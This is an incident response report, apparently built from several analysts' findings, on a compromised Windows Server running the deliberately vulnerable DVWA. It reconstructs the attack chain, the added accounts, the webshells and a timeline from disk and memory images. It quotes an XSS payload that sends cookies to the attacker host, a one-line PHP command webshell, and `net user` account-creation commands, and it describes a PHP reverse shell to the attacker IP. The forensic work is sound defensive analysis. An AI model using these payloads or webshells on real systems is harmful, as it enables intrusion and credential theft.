# Incident Response Report — s4a-challenge4 / memdump.mem

**Case:** compromise of a Windows Server 2008 SP1 (x86) host running XAMPP + DVWA.
**Evidence:** `inputs/s4a-challenge4` (25 GB raw disk, single NTFS volume at sector offset 2048)
and `inputs/memdump.mem` (1 GB raw memory, Windows Server 2008 SP1 x86 PAE, hostname
`WIN-L0ZZQ76PMUF`, capture time `2015-09-03 10:04:05 UTC` per `vol windows.info`).
**Assembled by:** s2cb905 (critic/editor), folding in findings from s2cb900 (timeline),
s2cb901 (software), s2cb902/s2cb904 (memory), s2cb903 (accounts/registry/EVTX), s2cb906 (disk triage).

All filesystem evidence is read in place with The Sleuth Kit (`mmls`, `fls`, `icat`, `istat`)
against `inputs/s4a-challenge4` at `-o 2048`; all memory evidence uses Volatility 3
(`vol -f inputs/memdump.mem -u https://isf-server.techanarchy.net ...`). Extracted artifacts
are under `work/extracted/` and `work/leftovers/`.

---

## 1. Type of attacks

The host was compromised through a **web-application attack against the XAMPP-hosted
Damn Vulnerable Web Application (DVWA)**, followed by **web-shell deployment, local account
creation, and a reverse shell callback**.

Specific attack techniques observed (all in `xampp/apache/logs/access.log`, inode 59684,
extracted to `work/leftovers/apache-access.log`, and `xampp/php/logs/php_error_log`,
inode 60477):

1. **Brute-force / credential guessing** — repeated `POST /dvwa/login.php` from the attacker
   (4 login attempts on 2015-08-23 22:24 UTC).
2. **Stored & reflected Cross-Site Scripting (XSS)** — `POST /dvwa/vulnerabilities/xss_s/`;
   reflected-XSS cookie-theft payload
   `?name=<script>document.location="http://192.168.56.102/?"+document.cookie</script>`.
3. **SQL injection** — `POST /dvwa/vulnerabilities/sqli/` (`php_error_log`:
   `mysql_numrows() ... boolean given`).
4. **Local/remote file inclusion** — `include(../../xampp/phpMyAdmin/config.inc)` attempts
   (`php_error_log`).
5. **Command injection** — `POST /dvwa/vulnerabilities/exec/`; the attacker wrote
   `Users/Administrator/data.txt` containing the string `hello` (inode 60464, MD5 of `hello`
   = `5d41402abc4b2a76b9719d911017c592`).
6. **Unrestricted file upload** — `POST /dvwa/vulnerabilities/upload/` used to upload PHP
   webshells into `xampp/htdocs/DVWA/hackable/uploads/`.
7. **Webshell command execution** — `phpshell.php?cmd=dir`, `phpshell.php?cmd=mkdir abc`,
   and `POST /dvwa/c99.php?act=cmd`.
8. **Reverse shell** — `phpshell2.php` is a PHP reverse-TCP shell to
   `192.168.56.102:4545`.
9. **Local account creation & privilege escalation** — two local accounts added and placed
   in `Remote Desktop Users` (see §2).

**Attacker:** `192.168.56.102`, Kali Linux (User-Agent
`Mozilla/5.0 (X11; Linux x86_64; rv:38.0) ... Iceweasel/38.2.0`). Victim web server =
`192.168.56.101`.

---

## 2. How many users were added, and how

**Two local accounts were added:** `user1` (RID 1005) and `hacker` (RID 1006).

Evidence (from `work/extracted/SAM`, SHA-256 `a449fbe4...`, extracted from inode 18491-128-3
with `icat -o 2048 inputs/s4a-challenge4 18491-128-3`):

- `SAM\Domains\Account\Users\Names\user1` → RID 1005, last-write `2015-09-02T09:05:06Z`.
- `SAM\Domains\Account\Users\Names\hacker` → RID 1006, last-write `2015-09-02T09:05:25Z`.
- RID keys `000003ED` (user1) and `000003EE` (hacker) carry the same last-write and
  password-last-set timestamps.

Both accounts were added to built-in group aliases `0x221` (Users) **and** `0x22b`
(**Remote Desktop Users**), per
`SAM\Domains\Builtin\Aliases\Members\S-1-5-21-3848053756-3249532031-1848221756\000003ED`
and `...\000003EE` (membership last-writes `2015-09-02T09:18:09Z` / `09:19:24Z`). This shows
the attacker intended persistent remote-desktop access.

**How they were added:** the exact account-management audit event (4720/4732) was not
retained in `work/extracted/Security.evtx`, so the method is reconstructed from two
complementary evidence streams:

- **Command-line (`net user ... /add`):** `work/leftovers/apache-error.log` contains three
  copies of `The password does not meet the password policy requirements ... NET HELPMSG 2245`,
  i.e. the attacker ran `net user <name> <weak-pass> /add` (blocked by Windows password
  policy) — captured output of the shell/command-injection session.
- **GUI (Computer Management):** `work/extracted/Administrator.NTUSER.DAT` UserAssist shows
  `C:\Windows\system32\CompMgmtLauncher.exe` executed at `2015-09-02T09:01:02Z`, immediately
  after an elevated interactive `Administrator` logon (Security.evtx 4624/4672 at
  `2015-09-02T09:00:57Z`) and four minutes before the two SAM accounts appear.

Conclusion: **2 accounts added; most consistent with the attacker adding them while already
operating as Administrator on the box, with both command-line (`net user`) and
Computer-Management evidence present.** (No profile-directory entries exist for `user1`/`hacker`
in `ProfileList`, suggesting they never completed an interactive logon.)

---

## 3. Leftovers (files, tools, info left behind)

The attacker did not clean up. Leftover artifacts (all under `inputs/s4a-challenge4`):

**Webshells / tools dropped in `xampp/htdocs/DVWA/`:**

| Path | Inode | Size | Description |
|---|---|---|---|
| `hackable/uploads/phpshell.php` | 62330-128-3 | 31 B | `<?php system($_GET["cmd"]); ?>` one-liner |
| `webshells.zip` | 62331-128-1 | 42095 B | attacker toolkit ZIP (contains `c99.php` + `webshell.php`) |
| `webshells/` (dir) | 62332-144-1 | — | extraction dir |
| `webshell.php` | 62334-128-1 | 31 B | `<?php system($_GET["cmd"]); ?>` one-liner |
| `c99.php` | 62333-128-3 | 156208 B | c99shell v1.0 beta (CCTeaM) full-featured PHP shell |
| `hackable/uploads/abc/` (dir) | 62335-144-1 | — | created by `mkdir abc` |
| `hackable/uploads/phpshell2.php` | 62337-128-4 | 945 B | PHP reverse shell → `192.168.56.102:4545` |

**Other leftovers:**

- `Users/Administrator/AppData/Local/Temp/c99 (2).php` (inode 62338-128-4, **deleted**,
  153275 B) — a copy of the c99 shell, same size as the copy inside `webshells.zip`.
- `Users/Administrator/data.txt` (inode 60464, content `hello`) — command-injection write test.
- Two now-deleted PHP backdoors `/tmpukudk.php` and `/tmpudvfh.php` (referenced only in
  `access.log`, hit by `Python-urllib/2.7`) — evidence of an additional Python-driven
  backdoor phase.
- PHP session files in `xampp/tmp/sess_*` (in-memory `filescan` also shows these), including
  `sess_jl2dr1tc993jb1u4kp8jbeghs2` (content `dvwa|a:0:{}`).
- No separate native tools (no `nc.exe`, `mimikatz`, `pwdump`, `psexec`, etc.) were found —
  the attacker operated purely through PHP webshells.
- `Windows/System32/Tasks` holds only default Microsoft tasks (no attacker persistence task);
  `Windows/Prefetch` is empty.

(Extracted copies and hashes are recorded in `work/leftovers.md` and `work/disk_triage.md`.)

---

## 4. Installed software and provenance

| Software | Install evidence | Attacker-installed? |
|---|---|---|
| Windows Server 2008 Standard SP1 (x86) | OS baseline (`windows.info`, System.evtx 6009) | No (baseline) |
| Oracle VM VirtualBox Guest Additions 4.3.30 | `HKLM\...\Uninstall` last-write `2015-08-24T07:14:15Z` | No (VM baseline) |
| Microsoft Visual C++ 2008 Redistributable x86 9.0.21022 | Uninstall key `{FF66E9F6-...}`, last-write `2015-08-23T21:43:54Z` | No (XAMPP dependency) |
| **XAMPP 5.6.11-1** (Apache 2.4.16 / PHP 5.6.11 / MySQL 5.6.25 / FileZilla) | Uninstall key `xampp`; installer `Users/Administrator/Desktop/xampp-win32-5.6.11-1-VC11-installer.exe` (inode 12911-128-1, crtime 2015-08-23 21:40 UTC) | **No** — installed by Administrator |
| **DVWA** (Damn Vulnerable Web Application) | `xampp/htdocs/DVWA/` (inode 12859, crtime 2015-08-23 21:52 UTC); `config.inc.php` (MySQL root / empty password) | **No** — installed as the (deliberately vulnerable) target |
| IIS (`inetpub/`) | `inetpub/` dir (inode 42386, crtime 2015-08-23 21:25 UTC) | No (Server role; not the active web server) |
| FTK Imager (AccessData) | `Temp/ad_driver.sys` = FTK Imager driver, crtime 2015-09-03 10:04:05 UTC | No — examiner/imaging tool (matches memdump capture time) |

The attacker did **not** install a persistent application; the attacker's "software" is the
set of dropped PHP webshells listed in §3. XAMPP and DVWA were already installed (by the
Administrator, from the desktop installer) before the attack, and the attacker simply abused
the vulnerable DVWA app.

---

## 5. Shellcode type (memory forensics)

Memory forensics (`vol -f inputs/memdump.mem`) did **not** recover a native x86 shellcode
blob: `windows.malfind` showed only weak/non-conclusive RWX pages, and the one suspicious
non-file-backed VAD (`svchost.exe` PID 1204 at `0x1140000`) was zeroed/empty when dumped
(`work/memory-findings.md` §7).

The actual "shell" payload in this case is **PHP, not machine code**:

- **PHP reverse TCP shell** — `xampp/htdocs/DVWA/hackable/uploads/phpshell2.php`
  (inode 62337) is a pentestmonkey-style reverse shell: it opens a socket to
  `192.168.56.102:4545`, reads a length-prefixed payload, and `eval()`s it. The "shellcode"
  is therefore arbitrary **PHP code** delivered over that TCP session, not native shellcode.
- **PHP command-execution one-liners** — `phpshell.php`/`webshell.php`
  (`system($_GET["cmd"])`) and the full **c99** PHP shell (used via `POST /dvwa/c99.php?act=cmd`).

Memory confirms the delivery/execution context: `httpd.exe` (PIDs 2796/2880) had the PHP
engine and `php_sockets.dll`/`php_curl.dll` loaded (`windows.dlllist`), was listening on
80/443, held open handles to `xampp/apache/logs/access.log` and `error.log`, and two
`cmd.exe` processes ran under the Administrator profile (`windows.pslist`, `windows.handles`).
So memory supports "web-application compromise → PHP webshell → reverse-shell/code-exec",
with the payload being **PHP (reverse-shell) code** rather than a recoverable reflective
native implant.

---

## 6. Timeline analysis

The merged master timeline is in **`work/timeline.md`** (61 table rows). High-level summary
(timestamps normalized to UTC):

- **2015-08-23 21:15–21:45 UTC** — OS/app events; `inetpub` created (21:25), XAMPP installer
  placed (21:40), `C:\xampp` created (21:41), XAMPP/MySQL startup (21:45).
- **2015-08-23 21:52 UTC** — DVWA directory created.
- **2015-08-23 22:24 UTC** — attacker (192.168.56.102) first DVWA recon + login brute-force.
- **2015-08-24 06:51–06:57 UTC** — reboot/time-change; Administrator logons.
- **2015-09-02 08:43 UTC** — `POST /dvwa/setup.php` (DVWA DB created).
- **2015-09-02 08:44–09:28 UTC** — XSS / command-injection / file-include abuse; `data.txt`
  written (09:32); backdoor `POST /tmpukudk.php` (11:25); second backdoor `POST /tmpudvfh.php`
  (2015-09-03 06:52).
- **2015-09-02 09:00–09:19 UTC** — elevated Administrator logon; `CompMgmtLauncher.exe`;
  accounts `user1` (09:05:06) and `hacker` (09:05:25) added, then placed in Remote Desktop
  Users (09:18/09:19).
- **2015-09-03 07:10–07:31 UTC** — webshell drop & use: `phpshell.php` (07:10:15),
  `webshells.zip`/`c99.php`/`webshell.php` (07:14:48–57), `mkdir abc` (07:17:58),
  `Temp/c99 (2).php` (07:20:14), `c99.php?act=cmd` (07:20:45–07:21:37), reverse shell
  `phpshell2.php` uploaded (07:31:30) and fired (07:31:54).
- **2015-09-03 10:04:05 UTC** — memory captured (FTK Imager driver loaded) — post-exploitation.

---

## 7. Hypothesis and approach

**Hypothesis:** A Kali attacker (`192.168.56.102`) targeted an intentionally-exposed,
vulnerable web server — XAMPP on Windows Server 2008 — running **DVWA**. The attacker first
reconnoitered and brute-forced the DVWA login, then worked through DVWA's vulnerable modules
(SQL injection, XSS, file inclusion, and command injection), using the command-injection
(exec) module to run commands as the `Administrator` (IIS/Apache service account context).
With command execution, the attacker (or a prior interactive session) created two local
accounts (`user1`, `hacker`) and added them to `Remote Desktop Users` for persistence. In the
final phase the attacker uploaded a set of PHP webshells (a `system($_GET["cmd"])` one-liner,
the c99 shell, and a PHP reverse shell) through DVWA's unrestricted file-upload, used the
c99 shell for command execution, and opened a reverse shell back to
`192.168.56.102:4545`. The attacker did not clean up, leaving all webshells and command
output in place. The memory image captured the still-running XAMPP/Apache/PHP/MySQL stack
shortly afterwards.

**Approach:** (1) partition/FS triage (`mmls`/`fls`/`icat`/`istat`) to build a full file list
and MFT timeline; (2) registry (SAM/SYSTEM/SOFTWARE/SECURITY/NTUSER.DAT) for accounts,
software, and logons; (3) web/event-log analysis (Apache access/error, `php_error_log`,
Windows EVTX) for the attack narrative; (4) memory forensics (Volatility 3) for processes,
modules, handles, network connections, and injection/shellcode assessment; (5) cross-referenced
MAC times and log timestamps into a single merged timeline; (6) cited every claim to a path,
inode, command, or hash.

---

## 8. Anything else

- **IOC summary:** attacker IP `192.168.56.102`; reverse-shell endpoint
  `192.168.56.102:4545`; webshell filenames `c99.php`, `phpshell.php`, `phpshell2.php`,
  `webshell.php`, `webshells.zip`; added accounts `user1`/`hacker`; backdoor paths
  `/tmpukudk.php`, `/tmpudvfh.php`.
- The machine clock/timezones are inconsistent across sources (Apache logs in `-0700`,
  `php_error_log` in `Europe/Berlin`, MFT in UTC, one clock rollback visible in `error.log`);
  the timeline is normalized to UTC and this is worth noting when correlating timestamps.
- `Temp/ad_driver.sys` and `FTK Imager.exe` are **examiner/imaging tooling**, not attacker
  malware — do not flag them.
- IIS (`inetpub`) is installed but the active web stack is XAMPP; treat `inetpub` as
  baseline, not the attack vector.

---

## Bonus — attacker-added directories and files (with proof)

Proof = NTFS MAC times from `work/bodyfile.txt` (`fls -l -m -o 2048`) correlated with the
192.168.56.102 web session; all timestamps are 2015-09-03 07:10–07:31 UTC unless noted.

1. `xampp/htdocs/DVWA/hackable/uploads/phpshell.php` — inode 62330, mtime `1441264215`.
2. `xampp/htdocs/DVWA/webshells.zip` — inode 62331, crtime `1441264488`.
3. `xampp/htdocs/DVWA/webshells/` — inode 62332, crtime `1441264491`.
4. `xampp/htdocs/DVWA/webshell.php` — inode 62334, mtime `1441264497`.
5. `xampp/htdocs/DVWA/c99.php` — inode 62333, ctime `1441264845`.
6. `xampp/htdocs/DVWA/hackable/uploads/abc/` — inode 62335, crtime `1441264678` (`mkdir abc`).
7. `xampp/htdocs/DVWA/hackable/uploads/phpshell2.php` — inode 62337, mtime `1441265490`.
8. `Users/Administrator/AppData/Local/Temp/c99 (2).php` — inode 62338 (**deleted**), mtime `1441264814`.
9. `Users/Administrator/data.txt` — inode 60464, content `hello` (command-injection test), 2015-09-02.
10. `/tmpukudk.php` and `/tmpudvfh.php` — now deleted; observed in `access.log` via
    `Python-urllib/2.7` on 2015-09-02 and 2015-09-03.

(`c99.php`/`webshell.php` carry older birth timestamps 2012/2014 — the original timestamps
stored inside `webshells.zip`, consistent with them being extracted from that archive.)
